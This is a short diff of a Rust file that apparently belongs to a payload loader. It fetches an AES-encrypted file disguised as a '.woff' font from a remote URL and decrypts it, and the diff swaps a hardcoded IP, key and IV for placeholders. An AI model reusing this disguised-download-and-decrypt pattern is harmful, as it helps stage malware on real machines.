@@ -5,10 +5,10 @@ use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
 
 type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
 
-const URL: &str = "http://192.168.78.129:8080/test.woff";
+const URL: &str = "http://URL_REPLACE_ME/test.woff";
 
-const AESKEY: &str = "D(G+KbPeShVmYq3t";
-const AESIV: &str  = "8y/B?E(G+KbPeShV";
+const AESKEY: &str = "AES_KEY_REPLACE_ME";
+const AESIV: &str  = "AES_IV_REPLACE_ME";
 
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     let mut key = [0x42; 16];
